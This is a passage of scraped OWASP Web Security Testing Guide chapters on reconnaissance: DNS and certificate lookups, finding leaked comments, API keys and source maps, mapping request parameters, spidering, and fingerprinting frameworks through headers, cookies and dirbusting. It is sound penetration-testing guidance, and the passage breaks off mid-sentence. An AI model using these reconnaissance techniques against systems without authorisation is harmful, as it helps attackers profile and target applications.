zone transfer, try setting the record type to PTR and issue a query on the given IP address. If the testers are fortunate, they may receive a DNS name entry in response. This technique relies on the existence of IP-to-symbolic name maps, which is not guaranteed.\n\n#### Web-based DNS Searches\n\nThis kind of search is akin to DNS zone transfer, but relies on web-based services that enable name-based searches on DNS. One such service is the [Netcraft Search DNS](https://searchdns.netcraft.com/?host) service. The tester may query for a list of names belonging to your domain of choice, such as `example.com`. They will then check whether the names they obtained are pertinent to the target they are examining.\n\n#### Reverse-IP Services\n\nReverse-IP services are similar to DNS inverse queries, with the difference that the testers query a web-based application instead of a name server. There are a number of such services available. Since they tend to return partial (and often different) results, it is better to use multiple services to obtain a more comprehensive analysis.\n\n- [MxToolbox Reverse IP](https://mxtoolbox.com/ReverseLookup.aspx)\n- [DNSstuff](https://www.dnsstuff.com/) (multiple services available)\n- [Net Square](https://web.archive.org/web/20190515092354/https://www.net-square.com/mspawn.html) (multiple queries on domains and IP addresses, requires installation)\n\n#### Googling\n\nFollowing information gathering from the previous techniques, testers can rely on search engines to possibly refine and increment their analysis. This may yield evidence of additional symbolic names belonging to the target, or applications accessible via non-obvious URLs.\n\nFor instance, considering the previous example regarding `www.owasp.org`, the tester could query Google and other search engines looking for information (hence, DNS names) related to the newly discovered domains of `webgoat.org`, `webscarab.com`, and `webscarab.net`.\n\nGoogling techniques are explained in [Testing: Spiders, Robots, and Crawlers](01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md).\n\n#### Digital Certificates\n\nIf the server accepts connections over HTTPS, then the Common Name (CN) and Subject Alternate Name (SAN) on the certificate may contain one or more hostnames. However, if the webserver does not have a trusted certificate, or wildcards are in use, this may not return any valid information.\n\nThe CN and SAN can be obtained by manually inspecting the certificate, or through other tools such as OpenSSL:\n\n```sh\nopenssl s_client -connect 93.184.216.34:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n```\n\n## Tools\n\n- DNS lookup tools such as `nslookup`, `dig` and similar.\n- Search engines (Google, Bing, and other major search engines).\n- Specialized DNS-related web-based search service: see text.\n- [Nmap](https://nmap.org/)\n- [Nessus Vulnerability Scanner](https://www.tenable.com/products/nessus)\n- [Nikto](https://www.cirt.net/nikto2)\n", "timestamp": "2025-10-24T11:39:42.484622"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md", "content": "# Review Web Page Content for Information Leakage\n\n|ID          |\n|------------|\n|WSTG-INFO-05|\n\n## Summary\n\nIt is very common, and even recommended, for programmers to include detailed comments and metadata on their source code. However, comments and metadata included in the HTML code might reveal internal information that should not be available to potential attackers. Comments and metadata review should be done in order to determine if any information is being leaked. Additionally some applications may leak information in the body of redirect responses.\n\nFor modern web apps, the use of client-side JavaScript for the frontend is becoming more popular. Popular frontend construction technologies use client-side JavaScript like ReactJS, AngularJS, or Vue. Similar to the comments and metadata in HTML code, many programmers also hardcode sensitive information in JavaScript variables on the frontend. Sensitive information can include (but is not limited to): Private API Keys (*e.g.* an unrestricted Google Map API Key), internal IP addresses, sensitive routes (*e.g.* route to hidden admin pages or functionality), or even credentials. This sensitive information can be leaked from such frontend JavaScript code. A review should be done in order to determine if any sensitive information leaked which could be used by attackers for abuse.\n\nFor large web applications, performance issues are a big concern to programmers. Programmers have used different methods to optimize frontend performance, including Syntactically Awesome Style Sheets (Sass), Sassy CSS (SCSS), webpack, etc. Using these technologies, frontend code will sometimes become harder to understand and difficult to debug, and because of it, programmers often deploy source map files for debugging purposes. A \"source map\" is a special file that connects a minified/uglified version of an asset (CSS or JavaScript) to the original authored version. Programmers are still debating whether or not to bring source map files to the production environment. However, it is undeniable that source map files or files for debugging if released to the production environment will make their source more human-readable. It can make it easier for attackers to find vulnerabilities from the frontend or collect sensitive information from it. JavaScript code review should be done in order to determine if any debug files are exposed from the frontend. Depending on the context and sensitivity of the project, a security expert should decide whether the files should exist in the production environment or not.\n\n## Test Objectives\n\n- Review web page comments, metadata, and redirect bodies to find any information leakage.\n- Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.\n- Identify if source map files or other frontend debug files exist.\n\n## How to Test\n\n### Review Web Page Comments and Metadata\n\nHTML comments are often used by the developers to include debugging information about the application. Sometimes, they forget about the comments and they leave them in production environments. Testers should look for HTML comments which start with `<!--`.\n\nCheck HTML source code for comments containing sensitive information that can help the attacker gain more insight about the application. It might be SQL code, usernames and passwords, internal IP addresses, or debugging information.\n\n```html\n...\n<div class=\"table2\">\n  <div class=\"col1\">1</div><div class=\"col2\">Mary</div>\n  <div class=\"col1\">2</div><div class=\"col2\">Peter</div>\n  <div class=\"col1\">3</div><div class=\"col2\">Joe</div>\n\n<!-- Query: SELECT id, name FROM app.users WHERE active='1' -->\n\n</div>\n...\n```\n\nThe tester may even find something like this:\n\n```html\n<!-- Use the DB administrator password for testing:  f@keP@a$$w0rD -->\n```\n\nCheck HTML version information for valid version numbers and Data Type Definition (DTD) URLs\n\n```html\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"https://www.w3.org/TR/html4/strict.dtd\">\n```\n\n- `strict.dtd` -- default strict DTD\n- `loose.dtd` -- loose DTD\n- `frameset.dtd` -- DTD for frameset documents\n\nSome `META` tags do not provide active attack vectors but instead allow an attacker to profile an application:\n\n```html\n<META name=\"Author\" content=\"Andrew Muller\">\n```\n\nA common (but not [WCAG](https://www.w3.org/WAI/standards-guidelines/wcag/) compliant) `META` tag is [Refresh](https://en.wikipedia.org/wiki/Meta_refresh).\n\n```html\n<META http-equiv=\"Refresh\" content=\"15;URL=https://www.owasp.org/index.html\">\n```\n\nA common use for `META` tag is to specify keywords that a search engine may use to improve the quality of search results.\n\n```html\n<META name=\"keywords\" lang=\"en-us\" content=\"OWASP, security, sunshine, lollipops\">\n```\n\nAlthough most web servers manage search engine indexing via the `robots.txt` file, it can also be managed by `META` tags. The tag below will advise robots to not index and not follow links on the HTML page containing the tag.\n\n```html\n<META name=\"robots\" content=\"none\">\n```\n\nThe [Platform for Internet Content Selection (PICS)](https://www.w3.org/PICS/) and [Protocol for Web Description Resources (POWDER)](https://www.w3.org/2007/powder/) provide infrastructure for associating metadata with Internet content.\n\n### Identifying JavaScript Code and Gathering JavaScript Files\n\nProgrammers often hardcode sensitive information with JavaScript variables on the frontend. Testers should check HTML source code and look for JavaScript code between `<script>` and `</script>` tags. Testers should also identify external JavaScript files to review the code (JavaScript files have the file extension `.js` and name of the JavaScript file usually put in the `src` (source) attribute of a `<script>` tag).\n\nCheck JavaScript code for any sensitive information leaks which could be used by attackers to further abuse or manipulate the system. Look for values such as: API keys, internal IP addresses, sensitive routes, or credentials. For example:\n\n```javascript\nconst myS3Credentials = {\n  accessKeyId: config('AWSS3AccessKeyID'),\n  secretAccessKey: config('AWSS3SecretAccessKey'),\n};\n```\n\nThe tester may even find something like this:\n\n```javascript\nvar conString = \"tcp://postgres:1234@localhost/postgres\";\n```\n\nWhen an API Key is found, testers can check if the API Key restrictions are set per service or by IP, HTTP referrer, application, SDK, etc.\n\nFor example, if testers find a Google Map API Key, they can check if this API Key is restricted by IP or restricted only per the Google Map APIs. If the Google API Key is restricted only per the Google Map APIs, attackers can still use that API Key to query unrestricted Google Map APIs and the application owner must pay for that.\n\n```html\n\n<script type=\"application/json\">\n...\n{\"GOOGLE_MAP_API_KEY\":\"AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\", \"RECAPTCHA_KEY\":\"6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\"}\n...\n</script>\n```\n\nIn some cases, testers may find sensitive routes from JavaScript code, such as links to internal or hidden admin pages.\n\n```html\n<script type=\"application/json\">\n...\n\"runtimeConfig\":{\"BASE_URL_VOUCHER_API\":\"https://staging-voucher.victim.net/api\", \"BASE_BACKOFFICE_API\":\"https://10.10.10.2/api\", \"ADMIN_PAGE\":\"/hidden_administrator\"}\n...\n</script>\n```\n\n### Identifying Source Map Files\n\nSource map files will usually be loaded when DevTools open. Testers can also find source map files by adding the \".map\" extension after the extension of each external JavaScript file. For example, if a tester sees a `/static/js/main.chunk.js` file, they can then check for its source map file by visiting `/static/js/main.chunk.js.map`.\n\nCheck source map files for any sensitive information that can help the attacker gain more insight about the application. For example:\n\n```json\n{\n  \"version\": 3,\n  \"file\": \"static/js/main.chunk.js\",\n  \"sources\": [\n    \"/home/sysadmin/cashsystem/src/actions/index.js\",\n    \"/home/sysadmin/cashsystem/src/actions/reportAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/cashoutAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/userAction.js\",\n    \"...\"\n  ],\n  \"...\"\n}\n```\n\nWhen sites load source map files, the frontend source code will become readable and easier to debug.\n\n### Identify Redirect Responses which Leak Information\n\nAlthough redirect responses are not generally expected to contain any significant web content there is no assurance that they cannot contain content. So, while series 300 (redirect) responses often contain \"redirecting to `https://example.com/`\" type content they may also leak content.\n\nConsider a situation in which a redirect response is the result of an authentication or authorization check, if that check fails the server may respond redirecting the user back to a \"safe\" or \"default\" page, yet the redirect response itself may still contain content which isn't shown in the browser but is indeed transmitted to the client. This can be seen either leveraging browser developer tools or via a personal proxy (such as ZAP, Burp, Fiddler, or Charles).\n\n## Tools\n\n- [Wget](https://www.gnu.org/software/wget/wget.html)\n- Browser \"view source\" function\n- Eyeballs\n- [Curl](https://curl.haxx.se/)\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [Burp Suite](https://portswigger.net/burp)\n- [Waybackurls](https://github.com/tomnomnom/waybackurls)\n- [Google Maps API Scanner](https://github.com/ozguralp/gmapsapiscanner/)\n\n## References\n\n- [KeyHacks](https://github.com/streaak/keyhacks)\n- [RingZer0 Online CTF](https://ringzer0ctf.com/challenges/104) - Challenge 104 \"Admin Panel\".\n\n### Whitepapers\n\n- [HTML version 4.01](https://www.w3.org/TR/1999/REC-html401-19991224)\n- [XHTML](https://www.w3.org/TR/2010/REC-xhtml-basic-20101123/)\n- [HTML version 5](https://www.w3.org/TR/html5/)\n", "timestamp": "2025-10-24T11:39:42.606162"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md", "content": "# Identify Application Entry Points\n\n|ID          |\n|------------|\n|WSTG-INFO-06|\n\n## Summary\n\nEnumerating the application and its attack surface is a key precursor before any thorough testing can be undertaken, as it allows the tester to identify likely areas of weakness. This section aims to help identify and map out areas within the application that should be investigated once enumeration and mapping have been completed.\n\n## Test Objectives\n\n- Identify possible entry and injection points through request and response analysis.\n\n## How to Test\n\nBefore any testing begins, the tester should always get a good understanding of the application and how the user and browser communicates with it. As the tester walks through the application, they should pay attention to all HTTP requests as well as every parameter and form field that is passed to the application. They should pay special attention to when GET requests are used and when POST requests are used to pass parameters to the application. In addition, they also need to pay attention to when other methods for RESTful services are used.\n\nNote that in order to see the parameters sent in the body of requests such as a POST request, the tester may want to use a tool such as an intercepting proxy (see [tools](#tools)). Within the POST request, the tester should also make special note of any hidden form fields that are being passed to the application, as these usually contain sensitive information such as state information, quantity of items, the price of items, etc., that the developer never intended for anyone to see or change.\n\nThe usage of an intercepting proxy and a note taking application (for example, a spreadsheet software) for this stage of testing is popular among testers. The proxy will keep track of every request and response between the tester and the application as they explore it. Additionally, at this point, testers usually trap every request and response so that they can see exactly every header, parameter, etc. that is being passed to the application and what is being returned. This can be quite tedious at times, especially on large interactive sites (think of a banking application). However, experience will show what to look for and this phase can be significantly optimized.\n\nAs the tester walks through the application, they should take note of any interesting parameters in the URL, custom headers, or body of the requests/responses, and save them in a spreadsheet. The spreadsheet should include the page requested (it might be good to also add the request number from the proxy, for future reference), the interesting parameters, the type of request (GET, POST, etc.), if access is authenticated/unauthenticated, if TLS is used, if it's part of a multi-step process, if WebSockets are used, and any other relevant notes. Once they have every area of the application mapped out, they can then go through the application and test each of the areas that they have identified and make notes for what worked and what didn't work. The rest of this guide will identify how to test each of these areas of interest, but this section must be undertaken before any of the actual testing can commence.\n\nBelow are some points of interests for all requests and responses. Within the requests section, focus on the GET and POST methods as these comprise majority of the requests. Note that other methods, such as PUT and DELETE can also be found. Often, such rarer requests, if allowed, can expose vulnerabilities. There is a special section in this guide dedicated for testing these HTTP methods.\n\n### Requests\n\n- Identify where GETs are used and where POSTs are used.\n- Identify all the parameters used in a POST request (these are in the body of the request).\n- Within the POST request, pay special attention to any hidden parameters. When a POST is sent, all the form fields (including hidden parameters) will be sent in the body of the HTTP message to the application. These typically aren't seen unless a proxy is used, or the HTML source code is viewed. Altering these hidden parameters may result in changes to the following pages that load, the data they contain, and the degree of access granted.\n- Identify all the parameters used in a GET request (i.e., in the URL), particularly the query string (usually appearing after a ? mark).\n- Identify all the parameters of the query string. These usually are in a pair format, such as `foo=bar`. Also note that many parameters can be in one query string separated by a `&`, `\\~`, `:`, or any other special character or encoding.\n- Please note, when identifying multiple parameters in one string or within a POST request, some or all of the parameters will be required to execute the attacks. The tester needs to identify all of the parameters (even if they are encoded or encrypted) and identify which ones are processed by the application. Later sections of the guide will cover how to test these parameters. At this point, it is important to make sure that each one of them is identified.\n- Also pay attention to any additional or custom type headers not typically seen (such as `debug: false`).\n\n### Responses\n\n- Identify where new cookies are set (`Set-Cookie` header), modified, or added to.\n- Identify any redirects (3xx HTTP status code), 400 status codes (particularly 403 Forbidden), and 500 internal server errors during normal responses (i.e., unmodified requests).\n- Also note where any interesting headers are used. For example, `Server: BIG-IP` indicates that the site is load balanced. Thus, if a site is load balanced and one server is incorrectly configured, then the tester might have to make multiple requests to access the vulnerable server, depending on the type of load balancing used.\n\n### OWASP Attack Surface Detector\n\nThe Attack Surface Detector (ASD) tool investigates the source code and uncovers the endpoints of a web application, the parameters these endpoints accept, and the data type of those parameters. This includes unlinked endpoints that a spider wouldn't be able to find, as well as optional parameters that are completely unused in the client-side code. It also has the capability to calculate the changes in attack surface between two versions of an application.\n\nThe Attack Surface Detector is available as a plugin to both ZAP and Burp Suite, and a command-line tool is also available. The command-line tool exports the attack surface as a JSON output, which can then be used by the ZAP and Burp Suite plugin. This is helpful for cases where the source code is not provided to the penetration tester directly. For example, the penetration tester can get the json output file from a customer who does not want to provide the source code itself.\n\n#### How to Use\n\nThe CLI jar file is available for download from [https://github.com/secdec/attack-surface-detector-cli/releases](https://github.com/secdec/attack-surface-detector-cli/releases).\n\nYou can run the following command for ASD to identify endpoints from the source code of the target web application.\n\n`java -jar attack-surface-detector-cli-1.3.5.jar <source-code-path> [flags]`\n\nHere is an example of running the command against [OWASP RailsGoat](https://github.com/OWASP/railsgoat).\n\n```text\n$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for '<...>/railsgoat' with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines '6'-'9')\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines '29'-'38')\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines '19'-'27')\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines '5'-'17')\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '11'-'31')\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '9'-'11')\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '13'-'15')\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines '8'-'13')\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for '<...>/railsgoat'\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument\n```\n\nYou can also generate a JSON output file using the `-json` flag, which can be used by the plugin for both ZAP and Burp Suite. See the following links for more details.\n\n- [Home of ASD Plugin for ZAP](https://github.com/secdec/attack-surface-detector-zap/wiki)\n- [Home of ASD Plugin for PortSwigger Burp](https://github.com/secdec/attack-surface-detector-burp/wiki)\n\n### Testing for Application Entry Points\n\nThe following are two examples on how to check for application entry points.\n\n#### Example 1\n\nThis example shows a GET request that would purchase an item from an online shopping application.\n\n```http\nGET /shoppingApp/buyme.asp?CUSTOMERID=100&ITEM=z101a&PRICE=62.50&IP=x.x.x.x HTTP/1.1\nHost: x.x.x.x\nCookie: SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy\n```\n\n> All the parameters of the request such as CUSTOMERID, ITEM, PRICE, IP, and the Cookie, which could just be encoded parameters or parameters used for session state.\n\n#### Example 2\n\nThis example shows a POST request that would log you into an application.\n\n```http\nPOST /example/authenticate.asp?service=login HTTP/1.1\nHost: x.x.x.x\nCookie: SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin&pass=pass123&debug=true&fromtrustIP=true\n```\n\nIt can be noted that the parameters are sent in several locations:\n\n1. In the query string: `service`\n2. In the Cookie header: `SESSIONID`, `CustomCookie`\n3. In the request body: `user`, `pass`, `debug`, `fromtrustIP`\n\nHaving a variety of injection locations provides the attacker with chaining possibilities that could improve the chances of finding a bug in the handling code.\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n- [Burp Suite](https://www.portswigger.net/burp/)\n- [Fiddler](https://www.telerik.com/fiddler)\n\n## References\n\n- [RFC 2616 – Hypertext Transfer Protocol – HTTP 1.1](https://tools.ietf.org/html/rfc2616)\n- [OWASP Attack Surface Detector](https://owasp.org/www-project-attack-surface-detector/)\n", "timestamp": "2025-10-24T11:39:42.704379"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application.md", "content": "# Map Execution Paths Through Application\n\n|ID          |\n|------------|\n|WSTG-INFO-07|\n\n## Summary\n\nBefore commencing security testing, understanding the structure of the application is paramount. Without a thorough understanding of the application's layout, a comprehensive test is unlikely.\n\n## Test Objectives\n\n- Map the target application and understand the principal workflows.\n\n## How to Test\n\nIn black-box testing, it is extremely difficult to test the entire codebase. This is not just because the tester cannot see the code paths through the application, but also because testing all the code paths would be extremely time-consuming. One way to reconcile this is to document the code paths that were discovered and tested.\n\nThere are several ways to approach the testing and measurement of code coverage:\n\n- **Path** - test each of the paths through an application that includes combinatorial and boundary value analysis testing for each decision path. While this approach offers thoroughness, the number of testable paths grows exponentially with each decision branch.\n- **Data Flow (or Taint Analysis)** - tests the assignment of variables via external interaction (normally users). Focuses on mapping the flow, transformation and use of data throughout an application.\n- **Race** - tests multiple concurrent instances of the application manipulating the same data.\n\nThe choice of method and the extent to which each method is used should be negotiated with the application owner. Additionally, simpler approaches could be adopted. For example, the tester could ask the application owner about specific functions or code sections that they are particularly concerned about, and discuss how those code segments can be reached.\n\nTo demonstrate code coverage to the application owner, the tester can start by documenting all the links discovered from spidering the application (either manually or automatically) in a spreadsheet. The tester can then look more closely at decision points in the application and investigate how many significant code paths are discovered. These should then be documented in the spreadsheet with URLs, prose and screenshot descriptions of the paths discovered.\n\n### Automatic Spidering\n\nAn automatic spider is a tool that is used to discover new resources (URLs) on a specific site automatically. It begins with a list of URLs to visit, called the seeds, which depends on how the Spider is started. While there are a lot of Spidering tools, the following example uses the [Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy):\n\n![Zed Attack Proxy Screen](images/OWASPZAPSP.png)\\\n*Figure 4.1.7-1: Zed Attack Proxy Screen*\n\n[ZAP](https://github.com/zaproxy/zaproxy) offers various automatic spidering options, which can be leveraged based on the tester's needs:\n\n- [Spider](https://www.zaproxy.org/docs/desktop/start/features/spider/)\n- [Ajax Spider](https://www.zaproxy.org/docs/desktop/addons/ajax-spider/)\n- [OpenAPI Support](https://www.zaproxy.org/docs/desktop/addons/openapi-support/)\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy)\n- [List of spreadsheet software](https://en.wikipedia.org/wiki/List_of_spreadsheet_software)\n- [Diagramming software](https://en.wikipedia.org/wiki/List_of_concept-_and_mind-mapping_software)\n\n## References\n\n- [Code Coverage](https://en.wikipedia.org/wiki/Code_coverage)\n", "timestamp": "2025-10-24T11:39:42.800010"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md", "content": "# Fingerprint Web Application Framework\n\n|ID          |\n|------------|\n|WSTG-INFO-08|\n\n## Summary\n\nIt wouldn't be a stretch to say that almost every conceivable idea for a web application has already been put into development. With the vast number of free and open-source software projects that are actively developed and deployed globally, it is very likely that an application security test will encounter a target that is entirely or partly dependent on these well-known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested helps the testing process significantly and will also drastically reduce the effort required during the test. These well-known web applications have specific HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most web frameworks have several markers in these locations, which can assist an attacker or tester in recognizing them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy, several markers are usually used.\n\n## Test Objectives\n\n- Fingerprint the components used by the web applications.\n\n## How to Test\n\n### Black-Box Testing\n\nThere are several common locations to consider in order to identify frameworks or components:\n\n- HTTP headers\n- Cookies\n- HTML source code\n- Specific files and folders\n- File extensions\n- Error messages\n\n#### HTTP Headers\n\nThe most basic form of identifying a web framework is to look at the `X-Powered-By` field in the HTTP response header. Many tools can be used to fingerprint a target, the simplest one is netcat.\n\nConsider the following HTTP Request-Response:\n\n```html\n$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono\n```\n\nFrom the `X-Powered-By` field, we understand that the web application framework is likely to be `Mono`. However, although this approach is simple and quick, this methodology doesn't work in all cases. It is possible to easily disable `X-Powered-By` header by a proper configuration. There are also several techniques that allow a site to obfuscate HTTP headers (see an example in the [Remediation](#remediation) section). In the example above, we can also note that a specific version of `nginx` is being used to serve the content.\n\nIn the same example, the tester could either miss the `X-Powered-By` header or obtain an answer like the following:\n\n```html\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears\n```\n\nSometimes there are more HTTP headers that point at a certain framework. In the following example, according to the information from HTTP request, one can see that `X-Powered-By` header contains PHP version. However, the `X-Generator` header points out the used framework is actually `Swiftlet`, which helps a penetration tester to expand their attack vectors. When performing fingerprinting, carefully inspect every HTTP header for such leaks.\n\n```html\nHTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet\n```\n\n#### Cookies\n\nAnother similar and somewhat more reliable way to determine the current web framework are framework-specific cookies.\n\nConsider the following HTTP request:\n\n![Cakephp HTTP Request](images/Cakephp_cookie.png)\\\n*Figure 4.1.8-7: Cakephp HTTP Request*\n\nThe cookie `CAKEPHP` has automatically been set, which gives information about the framework being used. A list of common cookie names is presented in [Cookies](#cookies-1) section. Limitations still exist in relying on this identification mechanism - it is possible to change the name of cookies. For example, for the selected `CakePHP` framework this could be done via the following configuration (excerpt from `core.php`):\n\n```php\n/**\n* The name of CakePHP's session cookie.\n*\n* Note the guidelines for Session names states: \"The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\"\n* @link https://php.net/session_name\n*/\nConfigure::write('Session.cookie', 'CAKEPHP');\n```\n\nHowever, these changes are less likely to be made than changes to the `X-Powered-By` header, making this approach to identification more reliable.\n\n#### HTML Source Code\n\nThis technique is based on finding certain patterns in the HTML page source code. Often one can find a lot of information which helps a tester to recognize a specific component. One of the common markers is HTML comments that directly lead to framework disclosure. More often, certain framework-specific paths can be found, i.e. links to framework-specific CSS or JS folders. Finally, specific script variables might also point to a certain framework.\n\nFrom the screenshot below, one can easily determine the framework in use and its version by the mentioned markers. The comment, specific paths and script variables can all help an attacker to quickly determine an instance of ZK framework.\n\n![ZK Framework Sample](images/Zk_html_source.png)\\\n*Figure 4.1.8-2: ZK Framework HTML Source Sample*\n\nFrequently such information is positioned in the `<head>` section of HTTP responses, in `<meta>` tags, or at the end of the page. Nevertheless, entire responses should be analyzed since it can be useful for other purposes such as inspection of other useful comments and hidden fields. Sometimes, web developers may not sufficiently obscure the information about the frameworks or components used. It is still possible to stumble upon something like this at the bottom of the page:\n\n![Banshee Bottom Page](images/Banshee_bottom_page.png)\\\n*Figure 4.1.8-3: Banshee Bottom Page*\n\n### Specific Files and Folders\n\nThere is another approach which greatly helps an attacker or tester to identify applications or components with high accuracy. Every web application component has its specific file and folder structure on the server. It has been noted that one can see the specific path from the HTML page source but sometimes they are not explicitly presented there and may still reside on the server.\n\nIn order to uncover them, a technique known as forced browsing or \"dirbusting\" is used. Dirbusting is brute forcing a target with known folder and filenames and monitoring HTTP-responses to enumerate server content. This information can be used both for finding default files and attacking them, and for fingerprinting the web application. Dirbusting can be done in several ways, the example below shows a successful dirbusting attack against a WordPress-powered target with the help of defined list and intruder functionality of Burp Suite.\n\n![Dirbusting with Burp](images/Wordpress_dirbusting.png)\\\n*Figure 4.1.8-4: Dirbusting with Burp*\n\nWe can see that for some WordPress-specific folders (for instance, `/wp-includes/`, `/wp-admin/` and `/wp-content/`) HTTP responses are 403 (Forbidden), 302 (Found, redirection to `wp-login.php`), and 200 (OK) respectively. This is a good indicator that the target is WordPress powered. The same way it is possible to dirbust different application plugin folders and their versions. In the screenshot below one can see a typical CHANGELOG file of a Drupal plugin, which provides information on the application being used and discloses a vulnerable plugin version.\n\n![Drupal Botcha Disclosure](images/Drupal_botcha_disclosure.png)\\\n*Figure 4.1.8-5: Drupal Botcha Disclosure*\n\nTip: before starting with dirbusting, check the `robots.txt` file first. Sometimes application specific folders and other sensitive information can be found there as well. An example of such a `robots.txt` file is presented on a screenshot below.\n\n![Robots Info Disclosure](images/Robots-info-disclosure.png)\\\n*Figure 4.1.8-6: Robots Info Disclosure*\n\nSpecific files and folders are different for each specific application. If the identified application or component is Open Source there may be value in setting up a temporary installation during penetration tests in order to gain a better understanding of what infrastructure or functionality is presented, and what files might be left on the server. However, several useful file lists already exist; one 